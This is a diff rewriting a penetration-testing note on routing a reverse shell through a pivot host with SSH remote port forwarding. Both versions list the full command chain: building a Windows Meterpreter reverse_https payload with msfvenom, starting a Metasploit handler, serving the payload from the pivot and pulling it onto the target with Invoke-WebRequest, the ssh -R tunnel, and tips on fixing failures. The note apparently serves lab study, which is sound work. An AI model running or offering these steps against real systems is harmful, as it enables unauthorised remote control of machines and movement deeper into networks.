@@ -1,53 +1,49 @@
-## Reverse Shell via SSH Remote Port Forwarding
+# SSH Remote Port Forwarding
 
-**When to use** Target host is isolated from the attack network and cannot route traffic to `<ATTACK_IP>`, requiring a dual-homed pivot host to proxy the reverse connection,.
+Use when the target can't reach your attack host directly — route the reverse connection through the pivot.
 
-**Commands**
+Scenario: Windows target → can only talk to internal network (172.16.5.0/23). Your attack host → not reachable from Windows directly. Ubuntu pivot → can reach both. Payload connects back to Ubuntu's internal IP, Ubuntu forwards it to your listener.
 
-1. Generate payload configured to call back to the pivot host's internal interface
+---
 
+## Setup Flow
+
+Generate payload pointing at the pivot host's internal IP and the forwarding port:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_INTERNAL_IP> LPORT=8080 -f exe -o <PAYLOAD>.exe
 ```
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_IP> LPORT=<PIVOT_PORT> -f exe -o <FILE_PATH>
-```
 
-2. Configure multi/handler to listen on all local interfaces
+Start MSF listener on your attack host — `LHOST 0.0.0.0` because the connection arrives via SSH tunnel:
 
 ```
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_https
 set lhost 0.0.0.0
-set lport <ATTACK_PORT>
+set lport 8000
 run
 ```
 
-3. Transfer payload to pivot host
+Create the SSH remote port forward — tells Ubuntu to listen on port 8080 and send anything it gets to your attack host port 8000:
 
-```
-scp <FILE_PATH> <USERNAME>@<PIVOT_IP>:~/
-```
-
-4. Start web server on pivot to facilitate download to the final target
-
-```
-python3 -m http.server <PORT>
+```bash
+ssh -R <PIVOT_INTERNAL_IP>:8080:0.0.0.0:8000 <USER>@<PIVOT_IP> -vN
 ```
 
-5. Download payload on target via PowerShell
+Serve the payload from the pivot and download it on the target:
 
+```bash
+# on pivot:
+python3 -m http.server 8123
 ```
-Invoke-WebRequest -Uri "http://<PIVOT_IP>:<PORT>/<FILE_PATH>" -OutFile "C:\<FILE_PATH>"
+
+```powershell
+# on Windows target:
+Invoke-WebRequest -Uri "http://<PIVOT_INTERNAL_IP>:8123/<PAYLOAD>.exe" -OutFile "C:\<PAYLOAD>.exe"
 ```
 
-6. Establish remote port forward to map the pivot's listening port to the attack host's listener
+Execute the payload on Windows → connection goes `Windows → Ubuntu:8080 → SSH tunnel → attack host:8000 → MSF`.
 
-````
-ssh -R <PIVOT_IP>:<PIVOT_PORT>:0.0.0.0:<ATTACK_PORT> <USERNAME>@<PIVOT_IP> -vN
-```,
+> [!tip] MSF session will show `127.0.0.1` as the source IP — that's expected. The connection arrives over the local SSH socket, not directly from the Windows host.
 
-**Gotchas**
-- **LHOST must be set to the Pivot IP** in the payload generation, not the attack host, or the target will attempt to route to an unreachable network,.
-- **Incoming connection appears as 127.0.0.1** in Meterpreter because the traffic is received over a local SSH socket,.
-- **SSH -vN flags** are used to provide verbosity for troubleshooting and suppress the login shell to maintain the tunnel only.
-
-> ⚠️ Gap: Remote port forwarding to a specific interface (e.g., `<PIVOT_IP>`) typically requires **GatewayPorts** to be enabled in the pivot's `sshd_config`; otherwise, the port may only bind to the loopback interface, causing the target's connection to be refused.
-````
+> [!warning] `-R` syntax: `<PIVOT_INTERNAL_IP>:<PIVOT_PORT>:0.0.0.0:<LOCAL_LISTENER_PORT>`. Getting these backwards is the most common failure point. Pivot listens on 8080, your MSF listens on 8000.
